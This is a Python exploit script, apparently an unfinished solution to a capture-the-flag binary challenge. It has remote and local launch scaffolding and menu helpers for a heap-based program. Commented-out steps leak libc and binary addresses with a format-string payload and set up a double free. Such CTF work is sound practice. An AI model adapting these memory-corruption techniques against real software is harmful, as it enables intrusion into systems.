#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./chall')

host = args.HOST or 'compression.2021.ctfcompetition.com'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
def option(choice):
    sla("> ", str(choice))

def add(idx, size, data):
    print(f"allocating {idx} {size}")
    option(1)
    sla("> ", str(idx))
    sla("> ", str(size))
    sla("> ", data)

def delete(idx):
    option(2)
    sla("> ", str(idx))

def show(idx):
    option(3)
    sla("[Y/N]> ", "Y")
    sla("> ", str(idx))

io = start()
libc = ELF(exe.libc.path)
# add(0, 0x800, "A"*8)
# add(1, 0x7f, "A"*8)
# delete(0)
# show(0)
# reu("Contents:")
# libc.address = u64_bytes(6) - 0x1ebbe0
# log.info(f"libc base : {hex(libc.address)}")
# add(11, 0x30, "%1$p||%22$p")
# show(11)
# reu("Contents:")
# stack_leak = int(ren(14), 16)
# reu("||")
# exe.address = int(ren(14), 16) -  0x18e0
# print(hex(exe.address))
payload = "%1$p||%22$p"
# add(0, 0x100-2, payload) # 0
# add(1, 0x100-2, payload) # 1
# add(3, 0x100-2, payload) # 2
# add(5, 0x100-2, payload) # 3
# add(7, 0x100-2, payload) # 4
# add(9, 0x100-2, payload) # 5
# add(11,0x100-2, payload)# 6
# add(2, 0x100-2, payload) # 7
# add(4, 0x100-2, payload) # 8 chunk a 
# add(6, 0x100-2, payload) # 9 chunk b
# add(8, 0x10-2, "A")      # 10 to avoid consolidation
# delete(0) # 0
# delete(1) # 1
# delete(3) # 2
# delete(5) # 3
# delete(7) # 4
# delete(9) # 5
# delete(11)# 6
# delete(2) # 7
# delete(6) # chunk b
# delete(4) # chunk a
# delete(4)
# delete(2)
# add(6, 0x50-8-2, "A"*(0x50-8-2))
# pause()
# show(str(0)*999999999)
# # add(6, 0x50-8-2, 'A'*8)
# # add(8, 0x50-8-2, 'A'*8)
# # add(10, 0x50-8-2, 'A'*8)
io.interactive()

